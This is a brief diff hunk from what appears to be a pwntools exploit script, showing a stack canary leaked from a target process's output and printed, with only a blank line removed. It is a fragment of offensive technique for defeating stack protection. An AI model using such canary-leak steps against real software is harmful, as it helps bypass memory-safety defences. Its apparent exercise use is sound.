@@ -14,7 +14,6 @@ p.recvuntil("A" * 32)
 leak = p.recv(4)[1:]
 canary = u32(b"\x00" + leak)
 
-
 print(hex(canary))
 input()
 p.recvuntil(">> ")
